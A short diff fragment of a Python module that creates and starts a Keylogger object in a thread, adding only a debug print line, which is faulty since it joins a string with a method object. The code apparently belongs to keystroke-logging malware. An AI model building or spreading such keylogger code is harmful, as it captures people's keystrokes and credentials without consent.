@@ -20,6 +20,7 @@ def run(**args):
     keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
     
     def returnValue(keylogger):
+        print("function return started" + keylogger.__str__)
         return keylogger.__str__
     
     Thread(target = keylogger.start()).start()
